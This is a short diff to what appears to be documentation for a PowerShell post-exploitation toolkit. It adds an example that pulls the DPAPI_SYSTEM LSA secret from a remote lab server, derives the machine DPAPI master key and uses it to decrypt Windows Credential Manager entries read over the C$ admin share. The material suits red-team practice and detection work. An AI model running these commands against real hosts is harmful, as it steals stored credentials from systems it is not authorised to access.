@@ -552,6 +552,12 @@ $files = Get-TBOCredManFiles -ServerName corp1-web01.corp1.lab.home-labs.lol -Sc
 $files | Get-TBOCredManEntry | Select-Object SourcePath, HasDpapiBlob, DpapiBlobOffset
 
 Get-TBOCredManEntry -ServerName corp1-web01.corp1.lab.home-labs.lol -Path '\\corp1-web01.corp1.lab.home-labs.lol\C$\Users\jsmith\AppData\Local\Microsoft\Credentials\CRED_FILE'
+
+$mk = Get-TBORegLsaSecrets -ServerName corp1-web01.corp1.lab.home-labs.lol -Name DPAPI_SYSTEM |
+  Get-TBODpapiMasterKeys -Scope Machine |
+  Where-Object IsPreferred
+Get-TBOCredManFiles -ServerName corp1-web01.corp1.lab.home-labs.lol -Scope Machine |
+  Get-TBOCredManEntry -MasterKey $mk.MasterKey
 ```
 
 #### Get-TBORegAutoLogon
